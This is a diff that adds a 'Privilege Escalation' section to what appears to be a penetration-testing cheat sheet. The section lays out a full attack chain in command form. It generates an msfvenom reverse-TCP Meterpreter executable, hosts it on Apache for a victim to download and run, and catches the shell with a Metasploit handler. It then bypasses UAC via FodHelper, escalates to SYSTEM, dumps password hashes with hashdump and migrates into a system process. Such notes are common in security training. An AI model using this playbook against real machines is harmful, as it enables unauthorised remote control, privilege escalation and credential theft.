@@ -844,6 +844,91 @@ ipconfig            # Network interfaces
 
 Note: Stabalize shell by running `python3 -c 'import pty; pty.spawn("/bin/bash")'` after catching shell 
 
+---
+
+## Privilege Escalation
+
+### Full Attack Flow
+
+#### Step 1 — Generate Payload
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=444 -f exe > Windows.exe
+```
+
+#### Step 2 — Host Payload via Apache
+```bash
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+service apache2 start
+```
+
+#### Step 3 — Start Listener
+```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST [IP]
+set LPORT 444
+run
+```
+
+#### Step 4 — Victim Downloads and Runs Payload
+```
+Victim browses to: http://[ATTACKER IP]/share
+Downloads and runs Windows.exe
+Meterpreter session opens on attacker machine
+```
+
+#### Step 5 — Verify Initial Access
+```bash
+sysinfo    # Target machine info
+getuid     # Current user ID
+```
+
+### Bypass UAC (FodHelper)
+
+#### Background Session and Search
+```bash
+background                  # Background current session
+search bypassuac            # List all UAC bypass modules
+```
+
+#### Run FodHelper Bypass
+```bash
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+set LHOST [IP]
+set TARGET 0               # 0 = default exploit target
+exploit
+```
+
+#### Escalate to SYSTEM
+```bash
+getsystem -t 1             # Elevate to SYSTEM privileges
+getuid                     # Verify — should show NT AUTHORITY\SYSTEM
+background                 # Background the elevated session
+```
+
+### Privilege Escalation Commands
+```bash
+# Check current privileges
+getuid
+getsystem
+getsystem -t 1             # Technique 1 — named pipe impersonation
+
+# List privileges
+run post/multi/recon/local_exploit_suggester
+
+# Dump hashes after SYSTEM
+hashdump
+
+# Check processes for migration target
+ps
+migrate [PID]              # Migrate to SYSTEM process
+```
+
 
 ---
 
